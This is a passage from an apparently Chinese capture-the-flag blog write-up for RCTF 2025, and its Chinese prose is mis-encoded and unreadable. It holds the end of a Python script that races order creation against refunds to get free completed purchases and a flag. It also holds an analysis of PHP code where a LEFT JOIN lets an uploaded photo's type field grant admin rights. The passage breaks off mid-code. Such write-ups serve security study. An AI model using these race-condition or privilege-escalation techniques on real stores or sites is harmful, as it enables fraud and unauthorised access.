class="token string">"data"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">create_order</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> product_id<span class="token punctuation">,</span> quantity<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">,</span> coupon_id<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    body <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"productId"</span><span class="token punctuation">:</span> product_id<span class="token punctuation">,</span>        <span class="token string">"quantity"</span><span class="token punctuation">:</span> quantity<span class="token punctuation">,</span>        <span class="token string">"couponId"</span><span class="token punctuation">:</span> coupon_id<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> api_request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"/api/order/create"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">,</span> json<span class="token operator">=</span>body<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">refund_order</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> order_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> api_request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"/api/order/refund/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>order_id<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ensure_coupon_unused</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> coupon<span class="token punctuation">[</span><span class="token string">"isUsed"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>    orders <span class="token operator">=</span> get_orders<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">for</span> o <span class="token keyword">in</span> orders<span class="token punctuation">:</span>        <span class="token keyword">if</span> o<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"couponId"</span><span class="token punctuation">)</span> <span class="token operator">==</span> coupon_id <span class="token keyword">and</span> o<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"COMPLETED"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] Restoring coupon by refunding order </span><span class="token interpolation"><span class="token punctuation">&#123;</span>o<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            refund_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> o<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token keyword">not</span> coupon<span class="token punctuation">[</span><span class="token string">"isUsed"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">zero_cost_purchase</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> product_ids<span class="token punctuation">,</span> coupon_id<span class="token punctuation">,</span> target_name<span class="token punctuation">,</span> max_tries<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    target_pid <span class="token operator">=</span> product_ids<span class="token punctuation">[</span>target_name<span class="token punctuation">]</span>    base_pid <span class="token operator">=</span> product_ids<span class="token punctuation">[</span>BASE_PRODUCT_NAME<span class="token punctuation">]</span>    <span class="token keyword">for</span> attempt <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> max_tries <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_name<span class="token punctuation">&#125;</span></span><span class="token string"> try #</span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        ensure_coupon_unused<span class="token punctuation">(</span>token<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span>        base_resp <span class="token operator">=</span> create_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> base_pid<span class="token punctuation">,</span> quantity<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">,</span> coupon_id<span class="token operator">=</span>coupon_id<span class="token punctuation">)</span>        <span class="token keyword">if</span> base_resp<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">200</span> <span class="token keyword">or</span> <span class="token keyword">not</span> base_resp<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"  [-] base order failed:"</span><span class="token punctuation">,</span> base_resp<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        base_order_id <span class="token operator">=</span> base_resp<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"order"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>        create_result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        refund_result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">def</span> <span class="token function">t_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">nonlocal</span> create_result            create_result <span class="token operator">=</span> create_order<span class="token punctuation">(</span>                token<span class="token punctuation">,</span> target_pid<span class="token punctuation">,</span> quantity<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">,</span> coupon_id<span class="token operator">=</span><span class="token boolean">None</span>            <span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">t_refund</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">nonlocal</span> refund_result            refund_result <span class="token operator">=</span> refund_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> base_order_id<span class="token punctuation">)</span>        threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>t_create<span class="token punctuation">)</span><span class="token punctuation">,</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>t_refund<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        balance <span class="token operator">=</span> get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span>        target_order_id <span class="token operator">=</span> <span class="token boolean">None</span>        success_create <span class="token operator">=</span> create_result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> create_result<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            <span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> success_create<span class="token punctuation">:</span>            target_order_id <span class="token operator">=</span> create_result<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"order"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>        orders <span class="token operator">=</span> get_orders<span class="token punctuation">(</span>token<span class="token punctuation">)</span>        has_target_completed <span class="token operator">=</span> <span class="token builtin">any</span><span class="token punctuation">(</span>            o<span class="token punctuation">[</span><span class="token string">"productId"</span><span class="token punctuation">]</span> <span class="token operator">==</span> target_pid <span class="token keyword">and</span> o<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"COMPLETED"</span> <span class="token keyword">for</span> o <span class="token keyword">in</span> orders        <span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] balance=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>balance<span class="token punctuation">&#125;</span></span><span class="token string">, target_completed=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_target_completed<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> balance <span class="token operator">==</span> Decimal<span class="token punctuation">(</span><span class="token string">"10.00"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> has_target_completed<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [+] Got free COMPLETED order for </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">if</span> target_order_id<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] refund target order </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_order_id<span class="token punctuation">&#125;</span></span><span class="token string"> to restore balance"</span></span><span class="token punctuation">)</span>            refund_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> target_order_id<span class="token punctuation">)</span>            balance_after <span class="token operator">=</span> get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] balance after refund=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>balance_after<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">if</span> balance_after <span class="token operator">&lt;</span> Decimal<span class="token punctuation">(</span><span class="token string">"4.20"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"  [-] balance too low after refund, give up this user"</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> balance <span class="token operator">&lt;</span> Decimal<span class="token punctuation">(</span><span class="token string">"4.20"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"  [-] balance too low, give up this user"</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [-] Max tries reached for </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_name<span class="token punctuation">&#125;</span></span><span class="token string">, give up on this user."</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">conditions_satisfied</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> product_ids<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    orders <span class="token operator">=</span> get_orders<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    balance <span class="token operator">=</span> get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    completed <span class="token operator">=</span> <span class="token punctuation">[</span>o <span class="token keyword">for</span> o <span class="token keyword">in</span> orders <span class="token keyword">if</span> o<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"COMPLETED"</span><span class="token punctuation">]</span>    completed_pids <span class="token operator">=</span> <span class="token punctuation">&#123;</span>o<span class="token punctuation">[</span><span class="token string">"productId"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> o <span class="token keyword">in</span> completed<span class="token punctuation">&#125;</span>    has_all_products <span class="token operator">=</span> <span class="token builtin">all</span><span class="token punctuation">(</span>pid <span class="token keyword">in</span> completed_pids <span class="token keyword">for</span> pid <span class="token keyword">in</span> product_ids<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    has_balance_10 <span class="token operator">=</span> balance <span class="token operator">==</span> Decimal<span class="token punctuation">(</span><span class="token string">"10.00"</span><span class="token punctuation">)</span>    has_unused_coupon <span class="token operator">=</span> <span class="token keyword">not</span> coupon<span class="token punctuation">[</span><span class="token string">"isUsed"</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> has_all_products<span class="token punctuation">,</span> has_balance_10<span class="token punctuation">,</span> has_unused_coupon<span class="token punctuation">,</span> orders<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/flag/get"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] /api/flag/get:"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">return</span> data<span class="token keyword">def</span> <span class="token function">exploit_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_id<span class="token punctuation">,</span> token <span class="token operator">=</span> register_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    products <span class="token operator">=</span> get_products<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">for</span> name <span class="token keyword">in</span> TARGET_PRODUCTS<span class="token punctuation">:</span>        <span class="token keyword">assert</span> name <span class="token keyword">in</span> products<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"product </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string"> not found"</span></span>    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    coupon_id <span class="token operator">=</span> coupon<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>        <span class="token string-interpolation"><span class="token string">f"[+] User </span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">, coupon_id=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>coupon_id<span class="token punctuation">&#125;</span></span><span class="token string">, balance=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token punctuation">)</span>    <span class="token keyword">for</span> name <span class="token keyword">in</span> TARGET_PRODUCTS<span class="token punctuation">:</span>        ok <span class="token operator">=</span> zero_cost_purchase<span class="token punctuation">(</span>token<span class="token punctuation">,</span> products<span class="token punctuation">,</span> coupon_id<span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> ok<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    has_all<span class="token punctuation">,</span> has_bal10<span class="token punctuation">,</span> has_unused<span class="token punctuation">,</span> _ <span class="token operator">=</span> conditions_satisfied<span class="token punctuation">(</span>token<span class="token punctuation">,</span> products<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>        <span class="token string-interpolation"><span class="token string">f"[+] Final check: products=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_all<span class="token punctuation">&#125;</span></span><span class="token string">, balance10=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_bal10<span class="token punctuation">&#125;</span></span><span class="token string">, coupon_unused=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_unused<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token punctuation">)</span>    <span class="token keyword">if</span> has_all <span class="token keyword">and</span> has_bal10 <span class="token keyword">and</span> has_unused<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Conditions satisfied, requesting flag..."</span><span class="token punctuation">)</span>        get_flag<span class="token punctuation">(</span>token<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> attempt <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"===== Attempt </span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt<span class="token punctuation">&#125;</span></span><span class="token string"> ====="</span></span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> exploit_once<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] Error in attempt </span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬åœ°é…ç½®é«˜äº†åè€Œå¤ç°ä¸äº†ï¼ˆï¼‰</p><hr><h1 id="photographer"><a href="#photographer" class="headerlink" title="photographer"></a>photographer</h1><p>ç›´æ¥çœ‹è·å– flag çš„ä»£ç  superadmin.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/../app/config/autoload.php'</span><span class="token punctuation">;</span><span class="token class-name static-context">Auth</span><span class="token operator">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user_types</span> <span class="token operator">=</span> <span class="token function">config</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user_types'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name static-context">Auth</span><span class="token operator">::</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">Auth</span><span class="token operator">::</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$user_types</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'RCTF&#123;test_flag&#125;'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åªéœ€è¦ä½¿ç™»å½•ç”¨æˆ·çš„ type å°äº admin å³å¯ï¼Œè€Œ</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">'user_types' => <span class="token punctuation">[</span>    'admin' => <span class="token number">0</span><span class="token punctuation">,</span>    'auditor' => <span class="token number">1</span><span class="token punctuation">,</span>    'user' => <span class="token number">2</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿå°±æ˜¯è¯´ type å¾—å°äº 0</p><p>è€ƒè™‘ä»æ•°æ®åº“å…¥æ‰‹ï¼Œåœ¨ DB.php æŸ¥æ‰¾å¼•ç”¨ï¼Œæ³¨æ„åˆ° <code>leftJoin</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">findById</span><span class="token punctuation">(</span><span class="token variable">$userId</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token class-name static-context">DB</span><span class="token operator">::</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">)</span>        <span class="token operator">-></span><span class="token function">leftJoin</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'user.background_photo_id'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'='</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'photo.id'</span><span class="token punctuation">)</span>        <span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user.id'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'='</span><span class="token punctuation">,</span> <span class="token variable">$userId</span><span class="token punctuation">)</span>        <span class="token operator">-></span><span class="token function">first</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæ ¹æ®ç”¨æˆ· ID æŸ¥æ‰¾å¹¶è¿”å›è¯¥ç”¨æˆ·çš„ä¸€æ¡è®°å½•ï¼ŒåŒæ—¶å°è¯•æŠŠç”¨æˆ·çš„èƒŒæ™¯ç…§ç‰‡ä¿¡æ¯ï¼ˆå¦‚æœæœ‰ï¼‰ä¸€èµ·é€šè¿‡Â <code>LEFT JOIN</code>Â æ‹‰å‡ºæ¥ï¼Œæ­¤å¤„æ˜¯ photo ä¸ºä¸»è¡¨ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¯¹äºå·¦è¡¨ï¼ˆä¸»è¡¨ï¼‰ï¼Œ<code>LEFT JOIN</code>Â ä¼šä¿ç•™è¯¥è¡¨çš„æ‰€æœ‰è®°å½•ï¼Œå¦‚æœ photo æœ‰å’Œ user åŒæ ·çš„åˆ—åï¼Œé‚£ä¹ˆå°±ä¼šä»¥ photo ä¸ºå‡†</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251117005902470.png"></p><p>è§‚å¯Ÿå‘ç°ä¸¤ä¸ªè¡¨å‡å…·æœ‰ type å­—æ®µï¼Œå¯ä»¥å°è¯•æ„é€  photo çš„ type ä¸º -1ï¼Œè€Œ <code>findById</code> è¿”å›çš„ type å³ä¸º -1</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Auth</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">session_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">PHP_SESSION_NONE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">session_name</span><span class="token punctuation">(</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.name'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token class-name static-context">User</span><span class="token operator">::</span><span class="token function">findById</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œ findById è¢«ç”¨äº Auth åˆå§‹åŒ–ï¼Œé‚£ä¹ˆæ€è·¯å°±å®Œæ•´äº†</p><p>å…³äº photo çš„ type æ„é€ åœ¨ PhotoController::upload ä¸­ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string single-quoted-string">'name'</span> <span class="token operator">=></span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span 